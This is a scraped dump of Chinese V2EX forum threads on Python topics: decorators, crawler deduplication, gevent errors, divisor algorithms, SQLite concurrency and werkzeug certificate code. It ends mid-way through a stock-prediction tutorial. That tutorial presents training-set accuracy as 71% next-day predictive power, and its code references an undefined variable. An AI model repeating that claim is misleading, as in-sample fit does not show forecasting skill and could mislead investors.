能够发现这一层的封装，并把参数传递到装饰器的环境中。</p>\n<p><code>@use_logging(level=\"warn\")</code>等价于<code>@decorator</code></p>\n<p>###类装饰器\n没错，装饰器不仅可以是函数，还可以是类，相比函数装饰器，类装饰器具有灵活度大、高内聚、封装性等优点。使用类装饰器主要依靠类的<code>__call__</code>方法，当使用 @ 形式将装饰器附加到函数上时，就会调用此方法。</p>\n<pre><code>class Foo(object):\n    def __init__(self, func):\n        self._func = func\n \n    def __call__(self):\n        print ('class decorator runing')\n        self._func()\n        print ('class decorator ending')\n \n@Foo\ndef bar():\n    print ('bar')\n \nbar()\n</code></pre>\n<h3>functools.wraps</h3>\n<p>使用装饰器极大地复用了代码，但是他有一个缺点就是原函数的元信息不见了，比如函数的<code>docstring</code>、<code>__name__</code>、参数列表，先看例子：</p>\n<pre><code># 装饰器\ndef logged(func):\n    def with_logging(*args, **kwargs):\n        print func.__name__      # 输出 'with_logging'\n        print func.__doc__       # 输出 None\n        return func(*args, **kwargs)\n    return with_logging\n\n# 函数\n@logged\ndef f(x):\n   \"\"\"does some math\"\"\"\n   return x + x * x\n\nlogged(f)\n</code></pre>\n<p>不难发现，函数 f 被<code>with_logging</code>取代了，当然它的<code>docstring</code>，<code>__name__</code>就是变成了<code>with_logging</code>函数的信息了。好在我们有<code>functools.wraps</code>，<code>wraps</code>本身也是一个装饰器，它能把原函数的元信息拷贝到装饰器里面的 func 函数中，这使得装饰器里面的 func 函数也有和原函数 foo 一样的元信息了。</p>\n<pre><code>from functools import wraps\ndef logged(func):\n    @wraps(func)\n    def with_logging(*args, **kwargs):\n        print func.__name__      # 输出 'f'\n        print func.__doc__       # 输出 'does some math'\n        return func(*args, **kwargs)\n    return with_logging\n\n@logged\ndef f(x):\n   \"\"\"does some math\"\"\"\n   return x + x * x\n\n</code></pre>\n<h3>装饰器顺序</h3>\n<p>一个函数还可以同时定义多个装饰器，比如：</p>\n<pre><code>@a\n@b\n@c\ndef f ():\n\tpass\n</code></pre>\n<p>它的执行顺序是从里到外，最先调用最里层的装饰器，最后调用最外层的装饰器，它等效于</p>\n<pre><code>f = a(b(c(f)))\n</code></pre>\n<p>关注公众号 一个程序员的微站(VTtalk) 分享 Python 干货和有温度的内容</p>\n<p><img alt=\"image\" src=\"https://dn-mhke0kuv.qbox.me/cdf0ba1b22239721f759.jpg\"></p>\n</div></div>"], "reply": "56", "tittle": "理解 Python 装饰器就看这一篇", "comment": ["跟 JAVA  代理差不多？", "手动赞", "辛苦楼主了，手动点赞，收藏。", "一个装饰器都能扯这么长，也是厉害", "就是装饰模式", "“因为 python 可以返回函数对象，所以我们可以函数套函数，加个语法糖就是装饰器”\r", "你看我这么说吼不吼哇", "内容很熟悉，好像在哪里看过。", "应该是知乎，在知乎写过一个类似的回答，不过没有说清楚，于是重新整理了一次", " 比 Java 代理简单很多", "我总觉得吧，很单纯的技术问题，非要用各种莫名其妙的比喻，其实是背离本质的\r", "不管是喜欢看比喻的还是喜欢打比方的，都是外行", "很棒，看懂了。\r", "之前这块一直比较模糊，在开发 django 权限部分的时候，发现大量用到了装饰器。\r", "谢谢楼主！", " 技术也可以源自于生活，有时用生活的例子打比方只不过是让晦涩难懂的技术更好理解而已，这有什么问题呢？", " “也可以”并不等于“这就是”。打比方也并不能让它更容易理解，因为那东西本来并不简单。你这种片面的比方只能让一些不懂的人误以为自己懂了而已", " “打比方”本来就是一个类比的方式，帮助他们对新事物建立初步的映象。为啥在 PC 刚问世的时候乔布斯要把 PC 比喻成自行车，因为人们对 PC 没什么概念，但是自行车已经是他们日常生活的一部分啊", "一个返回函数的函数而已，这么简单的概念还要各种比喻，一个概念两件话就可以讲清楚，非要说上一大堆吧啦吧啦，而且我记得 V2EX 上不允许全文转载吧？有人 @管理员么？", "```python\r", "# 装饰器\r", "def logged(func):\r", "    def with_logging(*args, **kwargs):\r", "        print func.__name__      # 输出 'with_logging'\r", "        print func.__doc__       # 输出 None\r", "        return func(*args, **kwargs)\r", "    return with_logging\r", "\r", "# 函数\r", "\r", "def f(x):\r", "   \"\"\"does some math\"\"\"\r", "   return x + x * x\r", "\r", "logged(f)\r", "```\r", "这里是不是有问题？", " 有问题", "不就是一个高阶函数嘛……\r", "在任何一门函数式语言入门教程中，讲完这种东西都不会超过两句话……", "装饰器能写这么多。我服。", " 文章的目的是面向还不理解什么是装饰器的初学者，还请像您这样的大牛轻喷，不喜勿入", "就面向新手而言，我觉得这篇讲得挺好。\r", "不过好像哪里见过？我当初新学 python 的时候好像在哪看的就是这篇，瞬间茅塞顿开～不知是不是原作者", "觉得讲得还可以啊，两句话可以讲完是什么，但是这篇文章还讲了怎么用啊，不知道楼上都在喷什么？", "有的人真的很 mean.", "我在 SO 看过比这个长好几倍的，而且楼主也没写错什么啊，怎么你们了？", "Respect.", " 谢谢。我在知乎上写过一个类似的答案，那篇文章也同步在博客上，现在又在原基础上修正了一些错误", " @", " 谢谢你们的理解与支持", "很好理解 谢谢", "还可以扩展。比如还有 legb 没讲到。还可以讲讲用 class 来实现装饰器。\r", "对新手来说，装饰器并不好理解，因为其实牵涉到很多概念，远远超过了 Python 其他基础知识点的复杂度。这些概念对于熟悉它们的人来说，可能就像喝水一样自然，但对新手则是复杂的迷宫。\r", "这些说话尖刻的人，属于典型的没有同理心的那类人，他们不能理解别人的困难，因此在集体协作环境里很难有更大的作为。", "不好意思没仔细看，有 class 实现的装饰器，赞。", "看起来和传递调用 c 的函数指针差不多，只不过包装了语法糖而已", "写得不错", "窃以为不如 Pro Python 里的讲述...", "发现喷子真的好多啊，别人分享又没装逼，还用不就是 xxx ，服了之类的鄙视语气。", "这个马克之，一直对装饰不是很理解，谢谢", "怎么觉得像 AOP ？", "mark\r", "我的理解这就是一个 wrapper （中文貌似就是外覆器、包装器）。。", "def wrapper(*args, **kwargs):\r", "\t\t# args 是一个数组， kwargs 一个字典\r", "        logging.warn(\"%s is running\" % func.__name__)\r", "        return func(*args, **kwargs)\r", "    return wrapper\r", "\r", "你这个函数最后会让人绝望的，因为谁都看不懂", "作者讲的很好，浅显易懂，所谓由俭入奢易，由奢入俭难，懂得一项技术容易，把它用浅显易懂的道理讲出来就是不容易。\r", "\r", "V 站好些整瓶子不满半瓶子晃荡的玩意在这强行装逼，丢的是你自己的脸，还不自知。\r", "\r", "不用回复他们，让他们继续莫名优越感吧，毕竟 V 站日常。", "mark 很好的文章", "感谢楼主，非常棒的文章，已关注微信公众号", "面向初学者的很不错的文章，赞楼主的分享精神。", "很好很好，支持 lz 的分享。\r", "\r", "不过我有一个问题是：如果一个函数使用装饰器之后，我什么时候想要不调用装饰器增加的部分功能，直接调用这个函数本身应该怎么做呢？", " \r", "\r", "这说明你需要两个函数了。\r", "把装饰器理解为框架级别的东西，业务逻辑不要放装饰器里面。\r", "或者考虑使用带参数的装饰器。", "很早就关注了楼主的博客了，干货满满，向楼主学习！", "感谢楼主，讲的很棒", "可以，简单易懂", " 哦哦，确实可以用参数做开关就是哦， 3q~", "其实我理解装饰器就认准一个点： function wrapper 。核心思想还是在函数外面再包一层。\r", "相当于拿到输入先处理一下，再塞给函数，函数输出，再处理一下再返回给外部调用者\r", "不过装饰器如何使用一些默认变量需要记一下", "😄，谢谢楼上的各位， V 站还是充满了爱。给我们提供了一个友善的讨论环境。", "通熟易懂 赞一个", "   使用了 @", " 后， 可以通过__wraped__ 访问到被包装函数", "tab 空格混用……", "这个一直不太明白, 可能是因为用得少的缘故. 谢谢分享", "functools.wraps 这部分，元信息并没有被覆盖", "谢谢分享", " 哦哦，原来可以直接访问啊，学习了", "我还以为你有多污呢"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>rt <br>\n想要通过使用算法实现判断相似的 url 来去除结构相似的页面，减少后续功能的工作量。<br>\n现在看到网上推荐的爬虫去重有 BloomFilter 和 simhash 。<br>\n之前没有接触过去重这块的知识，有没有用过这两种算法的 V 友，或者说有更好的方法实现去重的，给点建议<br></p>\n</div></div>"], "reply": "5", "tittle": "关于爬虫去重算法 BloomFilter 和 simhash 这两个哪一个更好？", "comment": ["url 就用 bloomfilter, 如果是页面内容可以用 LSH", " 非常感谢", "BloomFilter 个 simhash 不是一类东西，要怎么放在一起比较？\r", "\r", "bloomfilter 是用来降低去重空间复杂度的。\r", "simhash 是用来降低相似度比较复杂度的。\r", "\r", "根本不是一个东西。而且，这两个东西\r", "\r", "bloomfilter ，如果你的 url 数小于 10 亿，不用考虑 bloomfilter ，直接数据库去重。\r", "simhash ， url 文本空间太小，不好使。用去除无用参数解决。", " 非常感谢", "bloomfilter 生产环境用过，有个很难受的地方就是，你无法从历史数据里删除某个 url"]},
{"content": ["<div class=\"topic_content\">如题，现在公司内部打算写一个包，　主要公司内部自己用，有可能提供给客户 /其他人用.\r<br>已经开发了一部分，使用了很多 python3 特有的东西, 比如 type hint.\r<br>现在想问的就是有必要兼容 python2 嘛？</div>"], "reply": "7", "tittle": "现在写 Python 的包, 还需要兼容 python2 嘛？", "comment": ["type hint 还是写在注释里面吧 orz ，不是 async await 这种能兼容还是尽量兼容吧，毕竟现在还有好多程序跑在 2 上", "如果没有历史遗留问题请不要再用 py2 了，我感觉 py2 还这么坚挺的原因就是还有一部分人没有放弃它。\r", "我一直在用 py3 ，也一直推荐身边的人从 2 转 3", "公司内部自己用，不用\r", "如果是提供给客户的必要组件，例如 SDK ，要。", "我还在用 py3....... 呆了两家公司 leader 都不愿意用 3..... 主要原因是公司所有人用的都是 2", "第一个\"py3\"改成->py2", "可以不兼容，比如 aliyun 的 mns SDK ，给客户用的，但只兼容 2 。", "async await 这种东西我怎么去兼容，根本管不了 py2 了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://github.com/gevent/gevent/issues/903\" rel=\"nofollow\">https://github.com/gevent/gevent/issues/903</a>\n有遇到过的吗</p>\n<p>这是python代码</p>\n<pre><code>import requests\nfrom gevent import monkey\nmonkey.patch_all()#加上这行就报错\nresponse = requests.get('https://www.baidu.com', timeout = 3600)\nprint(response)\n</code></pre>\n<p>报错信息如下</p>\n<pre><code>Traceback (most recent call last):\n  File \"Desktop/ttt.py\", line 5, in &lt;module&gt;\n    response = requests.get('https://www.baidu.com', timeout = 3600)\n  File \"/usr/local/lib/python3.6/site-packages/requests/api.py\", line 70, in get\n    return request('get', url, params=params, **kwargs)\n  File \"/usr/local/lib/python3.6/site-packages/requests/api.py\", line 56, in request\n    return session.request(method=method, url=url, **kwargs)\n  File \"/usr/local/lib/python3.6/site-packages/requests/sessions.py\", line 488, in request\n    resp = self.send(prep, **send_kwargs)\n  File \"/usr/local/lib/python3.6/site-packages/requests/sessions.py\", line 609, in send\n    r = adapter.send(request, **kwargs)\n  File \"/usr/local/lib/python3.6/site-packages/requests/adapters.py\", line 423, in send\n    timeout=timeout\n  File \"/usr/local/lib/python3.6/site-packages/requests/packages/urllib3/connectionpool.py\", line 594, in urlopen\n    chunked=chunked)\n  File \"/usr/local/lib/python3.6/site-packages/requests/packages/urllib3/connectionpool.py\", line 350, in _make_request\n    self._validate_conn(conn)\n  File \"/usr/local/lib/python3.6/site-packages/requests/packages/urllib3/connectionpool.py\", line 835, in _validate_conn\n    conn.connect()\n  File \"/usr/local/lib/python3.6/site-packages/requests/packages/urllib3/connection.py\", line 311, in connect\n    cert_reqs=resolve_cert_reqs(self.cert_reqs),\n  File \"/usr/local/lib/python3.6/site-packages/requests/packages/urllib3/util/ssl_.py\", line 264, in create_urllib3_context\n    context.options |= options\n  File \"/usr/local/Cellar/python3/3.6.0/Frameworks/Python.framework/Versions/3.6/lib/python3.6/ssl.py\", line 459, in options\n    super(SSLContext, SSLContext).options.__set__(self, value)\n  File \"/usr/local/Cellar/python3/3.6.0/Frameworks/Python.framework/Versions/3.6/lib/python3.6/ssl.py\", line 459, in options\n    super(SSLContext, SSLContext).options.__set__(self, value)\n  File \"/usr/local/Cellar/python3/3.6.0/Frameworks/Python.framework/Versions/3.6/lib/python3.6/ssl.py\", line 459, in options\n    super(SSLContext, SSLContext).options.__set__(self, value)\n  [Previous line repeated 323 more times]\nRecursionError: maximum recursion depth exceeded\n</code></pre>\n</div></div>", "<div class=\"topic_content\">感谢回复， python 个人也只是业余爱好，没事写点简单的爬虫，因为不了解 patch 的原理，所以以为只要放在代码执行前 patch 好就可以，这几天再看下 async 吧</div>"], "reply": "17", "tittle": "Python3.6.0 版 Gevent 报错。。。", "comment": ["某处的递归调用死循环了", " 关键这可能是框架的问题，不好解决", "先 patch...", "gevent 升级到 1.2a2 可以解决", " 我的 gevent 版本是 Version: 1.2.1 应该比 1.2a2 还新吧", "先 patch 再搞代码\r", "\r", "```\r", "#!/bin/env python\r", "from gevent import monkey\r", "monkey.patch_all()\r", "import requests\r", "r = requests.get(\"https://www.baidu.com\")\r", "print(r.status_code)\r", "```", "1.2.1 没有问题的，你肯定是用了 1.1.2 或者更低的版本", "对的，姿势也不对。确实要在 `import requests` 之前 patch", " \r", " \r", "惭愧啊。。。 （逃。。。", "我在 python3.5 时运行是没问题的，升级到 3.6 就不行了，没想到是执行顺序问题", "真的不想说你了，已经 python 3.6 了，直接用 async / await 不好吗？ gevent 是个很危险的方案， python 的作者也很不喜欢 gevent 。我已经不用 gevent 了。", " 我就想问问“ gevent 是个很危险的方案”这句话有依据么？而且不管怎么说 async / await 还是比 gevent 麻烦的多，而且还没办法兼容 python2.7 ，不要跟我说 py27 已经淘汰了，人家项目上就是要用，不是一个人可以左右的", "我就遇到过一个实习的，听我说 gevent 好用，结果发现用了几个月 patch 放后面，跟 TM 没用有啥区别", " python 作者很不喜欢 gevent ，这句话的出处可以给下吗？", " 话说我们正在开发中的项目在用这个组合。之所以大家不用 async 只是因为大家都不熟悉。个人看法是 gevent 除了性能开销，基本没有什么大问题...只是之前 0.1.2 时遇到过坑而已。个人看法是这俩切换起来并不难，先用 gevent 。反倒是用状态机，异步回调还是 协程， async 这俩 是更需要决策的...差别太大了。关于 gevent 靠不靠谱的问题可以看下 libco 这种类似的东西，不过我个人认为，不用显式状态转移的根本原因是:  人员素质。或者是人类的认知本身就不太适合状态转移。", "gevent 怎么说呢？它帮你做了很多东西，但是这些东西当你真正想动的时候就不好搞，比如若是你一个协程运行了超级久，我自己就对这个协程很无力，我无法在外部有任何方法可以终结*这一个*协程。当然你若是要做到这一步的话，可能 asyncio 可以提供更多的明确的控制精度，而且生态可能更好。\r", "gevent 的确是一个很不错的库，哪怕现在我司都上 Python3 ，我们还是很多项目在用着它。但是也是这样发现很多坑，比如一个 patch_all 过去，有时候正常运行的程序就变奇怪了。项目中用它， monkeypatch 的边界不好控制。\r", "还有就是提一个小技巧，若是要用 gevent 的 monkeypatch ，那么 monkeypatch 就要越早打越好。有很多污染是可通过在函数基本 import gevent 来解决的。大家可以多多尝试", " google guido gevent"]},
{"content": ["<div class=\"topic_content\">比如找 n 的所有约数\r<br>网上查到的都是从 1 到 n-1 迭代, 通过余数是否为 0 来判断, 效率无疑是很低的...\r<br>进一步想到, 其实从 1 迭代到(n/2)就可以了, 效率相对高了一点...\r<br>进一步又发现, 其实除了 1 之外的约数都是必定是成对出现的, 比如 80 的约数是 1, 2, 4, 5, 8, 10, 16, 20, 40, 想到可以从 2 开始迭代, 遇到能整除的情况, 就可以把整除后的结果作为迭代的终点, 这样范围可以迅速缩小, 找到 80 的所有约数只要迭代 8 次就可以了(2, 3, 4, 5, 6, 7, 8, 9)\r<br>因为搜不到啥资料...不知道是否还有更好的解法?</div>"], "reply": "14", "tittle": "关于找到所有约数的算法", "comment": ["不是 [2, sqrt(n)) 过一遍就好了么", "任意一个数都能表示成所有质数的乘积，根据这些质数可以算出有多少个约数\r", "当然并不能确定表示成质数乘积的过程比单次遍历快\r", "比如 80=2 的 4 次方*5 ，(4+1)*(1+1)=10\r", "可参考这个\r", " 他要的是约数，不是质因子", "先分解质因子，再合并出所有约数。如果你已经有了一个质数数组，那么分解这一步也可以做到很低的复杂度。", " 那上界还是 sqrt(n)，没毛病啊\r", "觉得大数情况下最快的办法还是找到所有质因子，然后组合出所有的约数吧，如 2L @", " 所说", "到 sqrt(n)就可以了，算素数反正也是 O(n),不如直接过一遍完事儿", "bool prime[maxv];\r", "    fill(prime,prime+maxv,true);\r", "    for(int i=0;i<maxv;++i) {\r", "        if(i%2==0) prime[i]=false;\r", "    }\r", "    for(int i=3;i<=sqrt(maxv);++i) {\r", "        if(prime[i]) {\r", "            for(int j=i*2;j<maxv;j+=i)\r", "                prime[j]=false;\r", "        }\r", "    }\r", "求出 2-n 所有的素数时间复杂度 O(n)\r", "楼主参考一下吧", " 求模运算这个 O 可不低喔", " 确实，取模消耗比较高。你这样好一些，就是麻烦点。", "分解个 RSA 公钥这些算法都跪了。。。", " 那你能给出一个不跪的分解 RSA 公钥的算法？", "量大的话，我能想到的方法是先维护一个素数数组，然后分解质因子，然后深度优先搜索枚举约数 ...", " 不能，但至少有比直接遍历好的，比如 yafu 用的算法。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>刚接触数据库一周，有几个问题不清楚\n1 ： sqlite 创建的数据库文件是.db 格式的文件，这个文件是否支持我从 win 拷贝粘贴到 Linux?如果可以拷贝过去的话数据是否完整？(我今天试了几次都出现了不同的异常，导致我后来直接在 Linux 上重新创建数据库了)\n2 ： mysql-connector-python 我在 mysql 官方网站上看到最新的支持 python3.4 ，我现在使用的是 python3.5 ， python3.5 是否能直接使用支持 python3.4 的 mysql-connector-python ？</p>\n<p>当然今天我也尝试了用 pymysql 这种第三方数据库连接，但是使用起来感觉比 sqlite 繁琐了，而且资料查起来也有点麻烦，不太愿意用。</p>\n</div></div>"], "reply": "3", "tittle": "关于 Python \\mysql\\sqlite", "comment": ["\r", "\r", "可以看看我正在写的一个 SQLite3 和 MySQL 的一个库……小项目用用还是可以的。。\r", "\r", "只不过还没丢到 pip 上…需要自己生成 pip 安装包…", "pymysql 麻烦吗 ？？", " 感觉和 mysql 官方版本还是有不同"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>用得是自带的 sqlite3 库，可能有 100 个左右的线程吧，目前是每个线程拥有一个单独的连接，所有连接的插入间隔大约是 0.00x 秒，会出现 datebase is locked 错误，请问怎么处理呢？</p>\n</div></div>"], "reply": "18", "tittle": "sqlite3 多线程高并发的访问如何处理？", "comment": ["弄一个队列写吧", "我怎么印象中 sqlite 用排队+锁的机制比多线程还要好一点\r", "100 线程的话为啥不考虑 mysql 啊", "写入发现被锁了就循环多试几次嘛，可以给个重试上限（例如五次，或者没上限也行）以及重试时间间隔等等。\r", "\r", "不过我记得好像有阻塞的写法吧，就是完成写入才返回那种。不知道你用的是什么编程语言？", " 因为想尽量用标准库完成。。", " Python", "糟糕没看节点（ Python ）。 pysqlite 不支持多线程共享连接是个问题。", "gevent 并发，这样同时只有一个读写 sqlite", " 是支持的，要开启一个选项", "sqlite 并发不行的， sqlite 的事务就是锁表，你无论开几个线程，只要访问的是同一张表，最后在 sqlite 那里都会被锁，实际上最后都是顺序执行的。\r", "\r", "正解是队列\r", "\r", "<del>更正确的解是换数据库</del>\r", "\r", " 重试一方面不优雅，另一方面会让性能更糟糕，堆积的重试操作多了之后，大家都抢不到锁。", "加个队列吧， sqlite 不适合高并发的", "# coding:utf-8\r", "import sqlite3\r", "import queue, os\r", "\r", "\r", "def singleton(cls):\r", "    instances = {}\r", "\r", "    def _singleton(*args, **kw):\r", "        if cls not in instances:\r", "            instances[cls] = cls(*args, **kw)\r", "        return instances[cls]\r", "\r", "    return _singleton\r", "\r", "\r", "\r", "class SQLiteUtil(object):\r", "    __queue_conn = queue.Queue(maxsize=1)\r", "    __path = None\r", "\r", "    def __init__(self, path):\r", "        self.__path = path\r", "        print('path:', self.__path)\r", "        self.__create_conn()\r", "\r", "    def __create_conn(self):\r", "        conn = sqlite3.connect(self.__path, check_same_thread=False)\r", "        self.__queue_conn.put(conn)\r", "\r", "    def __close(self, cursor, conn):\r", "        if cursor is not None:\r", "            cursor.close()\r", "        if conn is not None:\r", "            cursor.close()\r", "        self.__create_conn()\r", "\r", "    def execute_query(self, sql, params):\r", "        conn = self.__queue_conn.get()\r", "        cursor = conn.cursor()\r", "        value = None\r", "        try:\r", "            records = None\r", "            if not params is None:\r", "                records = cursor.execute(sql, params).fetchall()\r", "            else:\r", "                records = cursor.execute(sql).fetchall()\r", "            field = [i[0] for i in cursor.description]\r", "            value = [dict(zip(field, i)) for i in records]\r", "        finally:\r", "            self.__close(cursor, conn)\r", "        return value\r", "\r", "    def executescript(self, sql):\r", "        conn = self.__queue_conn.get()\r", "        cursor = conn.cursor()\r", "        try:\r", "            cursor.executescript(sql)\r", "            conn.commit()\r", "        except Exception as e:\r", "            conn.rollback()\r", "            raise\r", "        finally:\r", "            self.__close(cursor, conn)\r", "\r", "    def execute_update(self, sql, params):\r", "        return self.execute_update_many([sql], [params])\r", "\r", "    def execute_update_many(self, sql_list, params_list):\r", "        conn = self.__queue_conn.get()\r", "        cursor = conn.cursor()\r", "        count = 0\r", "        try:\r", "            for index in range(len(sql_list)):\r", "                sql = sql_list[index]\r", "                params = params_list[index]\r", "                if not params is None:\r", "                    count += cursor.execute(sql, params).rowcount\r", "                else:\r", "                    count += cursor.execute(sql).rowcount\r", "            conn.commit()\r", "        except Exception as e:\r", "            conn.rollback()\r", "            raise\r", "        finally:\r", "            self.__close(cursor, conn)\r", "        return count\r", "\r", "\r", "'''\r", "example:\r", "\r", "one = SQLiteUtil('xxx.sqlite')\r", "\r", "rst = one.execute_query('select * from website', None)\r", "for line in rst:\r", "    print(line.get('id'), line.get('url'), line.get('content'))\r", "\r", "\r", "print(one.execute_update('update website set content = \\'2222222\\' where id = ?', ('1',)))\r", "print(one.execute_update('update website set content = \\'2222222\\' where id = \\'1\\'', None))\r", "\r", "\r", "print('update many')\r", "count = one.execute_update_many(\r", "    [\r", "        'update website set content = \\'一\\' where id = \\'1\\'',\r", "        'update website set content = \\'二\\' where id = \\'2\\'',\r", "        'update website set content = 1 where id = \\'3\\''\r", "    ],\r", "    [None, None, None]\r", ")\r", "print('count:', count)\r", "'''\r", "\r", "python3 的 用 py2 自己改改，可抗千万级并发[v2ex 滑稽专属表情]", "楼主改 py2 了记得也贴下", "sqlite 是针对小型的移动设备设计的数据库。。。楼主这是准备拿 100 台手机来做服务器集群吗。。", " ", "\r", "差不多是这样吧", " 我发现我插入数据的平均速度是要大于这种写法的插入速度的……所以最后会导致内存爆炸", " 内存爆了找你程序内存爆的原因，不报： datebase is locked 错误说明并发解决了", "把你程序也贴出来大家观赏下[v2ex 滑稽]", " 我还没有试，我的意思是说我的平均插入速度要大于用这个方式做出来的函数的最高插入速度……所以无论如何还是会阻塞的。"]},
{"content": ["<div class=\"topic_content\">def generate_adhoc_ssl_pair(cn=None):\r<br>    from random import random\r<br>    crypto = _get_openssl_crypto_module()\r<br>\r<br>    # pretty damn sure that this is not actually accepted by anyone\r<br>    if cn is None:\r<br>        cn = '*'\r<br>\r<br>    cert = crypto.X509()\r<br>    cert.set_serial_number(int(random() * sys.maxsize))\r<br>    cert.gmtime_adj_notBefore(0)\r<br>    cert.gmtime_adj_notAfter(60 * 60 * 24 * 365)\r<br>\r<br>    subject = cert.get_subject()\r<br>    subject.CN = cn\r<br>    subject.O = 'Dummy Certificate'\r<br>\r<br>    issuer = cert.get_issuer()\r<br>    issuer.CN = 'Untrusted Authority'\r<br>    issuer.O = 'Self-Signed'\r<br>\r<br>    pkey = crypto.PKey()\r<br>    pkey.generate_key(crypto.TYPE_RSA, 2048)\r<br>    cert.set_pubkey(pkey)\r<br>    cert.sign(pkey, 'sha256')\r<br>\r<br>    return cert, pkey</div>"], "reply": "3", "tittle": "werkzeug 中 serving 中的一段代码，注释好像有亮点。。。。", "comment": ["你理解有问题吧。证书里面 cn 字段和中国没有半毛钱关系。网站用的证书 cn 需要设置为域名或者泛域名。\r", "\r", "这里测试证书直接把 cn 字段默认值设置成*，作者希望不会有人去信任它。仅此而已。", "CN (Common Name)\r", "不要自己臆想", " \r", " 受教了！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>今天想和大家分享一下如何利用 Python 拟合具有非平稳特征的神经网络，从而对股票进行预测。</p>\n<h1>建筑行业市值前六公司</h1>\n<p>中国建筑 - <a href=\"http://601668.SH\" rel=\"nofollow\">601668.SH</a>\n中国交建 - <a href=\"http://601800.SH\" rel=\"nofollow\">601800.SH</a>\n中国中铁 - <a href=\"http://601390.SH\" rel=\"nofollow\">601390.SH</a>\n中国铁建 - <a href=\"http://601186.SH\" rel=\"nofollow\">601186.SH</a>\n中国中冶 - <a href=\"http://601618.SH\" rel=\"nofollow\">601618.SH</a>\n中国电建 - <a href=\"http://601669.SH\" rel=\"nofollow\">601669.SH</a></p>\n<h1>建模计算分析</h1>\n<pre><code>import math\nimport numpy as np\nimport pandas as pd\nimport seaborn as sns\nsns.set_style('whitegrid') \nimport sklearn.neural_network\nfrom datetime import datetime\nimport matplotlib.pyplot as plt\nfrom sklearn import preprocessing\nfrom pandas import Series,DataFrame\nfrom statsmodels.tsa.stattools import adfuller\nfrom scipy.stats import norm, t, skew, kurtosis, kurtosistest, beta\n\n</code></pre>\n<p>对中国电建 - <a href=\"http://601669.SH\" rel=\"nofollow\">601669.SH</a> 进行预测</p>\n<pre><code># 前复权数据\ndata = pd.read_csv('建筑.csv',index_col=0)\ndata.head(3).append(data.tail(3))\n\n</code></pre>\n<pre><code>China_DJ = data['601669']\nnew_index = pd.to_datetime(China_DJ.index)\nY= Series(China_DJ.values,new_index)\nY.head(6)\n\n</code></pre>\n<pre><code>#收益率\nY_pct = Y.pct_change()\nY_pct= Y_pct[1:].copy()\nY_pct.head()\n\n</code></pre>\n<pre><code>#转换到 0 、 1\nf = lambda x: 1 if x &gt; 0 else -1\nY_pct = Y_pct.apply(f)\nY_pct.head()\n\n</code></pre>\n<pre><code>Y_pct = Y_pct.shift(-1,freq='1d')\nY_pct.head()\n\n</code></pre>\n<pre><code>#用 X 表示每日价格，来预测未来 601669 的收益\nnew_index1 = pd.to_datetime(data.index)\nX = DataFrame(data.values,new_index1)\nX.tail()\n\n</code></pre>\n<pre><code>X = X[:-2]\nX.index\n\n</code></pre>\n<pre><code>Y.index\n\n</code></pre>\n<pre><code>NN = sklearn.neural_network.MLPClassifier(solver='lbfgs', alpha=1e-5, hidden_layer_sizes=(10, 5))\n\n</code></pre>\n<pre><code>NN = NN.fit(X, Y)\nNN\n\n</code></pre>\n<p>MLPClassifier(activation='relu', alpha=1e-05, batch_size='auto', beta_1=0.9,\nbeta_2=0.999, early_stopping=False, epsilon=1e-08,\nhidden_layer_sizes=(10, 5), learning_rate='constant',\nlearning_rate_init=0.001, max_iter=200, momentum=0.9,\nnesterovs_momentum=True, power_t=0.5, random_state=None,\nshuffle=True, solver='lbfgs', tol=0.0001, validation_fraction=0.1,\nverbose=False, warm_start=False)</p>\n<pre><code>NN.predict(X)\n\n</code></pre>\n<p>array([ 1, -1, -1,  1,  1,  1,  1,  1, -1,  1,  1, -1, -1, -1, -1, -1,  1,\n-1, -1,  1,  1,  1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,  1,\n1,  1,  1, -1, -1, -1, -1,  1,  1,  1,  1,  1, -1, -1, -1, -1, -1,\n-1, -1, -1, -1, -1,  1, -1, -1,  1, -1, -1, -1, -1, -1, -1, -1, -1,\n-1, -1, -1, -1,  1, -1,  1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,\n-1, -1, -1, -1, -1,  1,  1,  1,  1,  1,  1,  1,  1,  1, -1], dtype=int64)</p>\n<pre><code>def check_accuracy(predictions, Y):\n    correct = len(Y4[predictions == Y])\n    return correct / float(len(Y))\n\n</code></pre>\n<pre><code>predictions = NN.predict(X)\ncheck_accuracy(predictions, Y)\n\n</code></pre>\n<p><strong>0.61</strong></p>\n<pre><code>imputer = preprocessing.Imputer()\nscaler = preprocessing.MinMaxScaler()\n\nX = imputer.fit_transform(X)\nX = scaler.fit_transform(X)\n\nNN = NN.fit(X, Y)\nNN\n\n</code></pre>\n<p>MLPClassifier(activation='relu', alpha=1e-05, batch_size='auto', beta_1=0.9,\nbeta_2=0.999, early_stopping=False, epsilon=1e-08,\nhidden_layer_sizes=(10, 5), learning_rate='constant',\nlearning_rate_init=0.001, max_iter=200, momentum=0.9,\nnesterovs_momentum=True, power_t=0.5, random_state=None,\nshuffle=True, solver='lbfgs', tol=0.0001, validation_fraction=0.1,\nverbose=False, warm_start=False)</p>\n<pre><code>NN.predict(X)\n\n</code></pre>\n<p>array([-1, -1, -1,  1, -1,  1, -1,  1, -1, -1,  1, -1, -1, -1, -1, -1, -1,\n-1,  1, -1,  1, -1, -1, -1, -1,  1, -1, -1, -1, -1, -1, -1, -1,  1,\n-1,  1,  1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,\n-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,\n-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,\n-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,  1,  1, -1, -1], dtype=int64)</p>\n<pre><code>predictions = NN.predict(X)\ncheck_accuracy(predictions, Y4)\n\n</code></pre>\n<p><strong>0.71</strong></p>\n<p>可以预测第二天的方向超过 71%的时间</p>\n<pre><code># 前复权数据\nOOS_pricing_data = pd.read_csv('建筑 2.csv',index_col=0)\nOOS_pricing_data.head(3).append(OOS_pricing_data.tail(3))\n\n</code></pre>\n<pre><code>Y1 = OOS_pricing_data['601669']\nnew_index = pd.to_datetime(Y1.index)\nY5 = 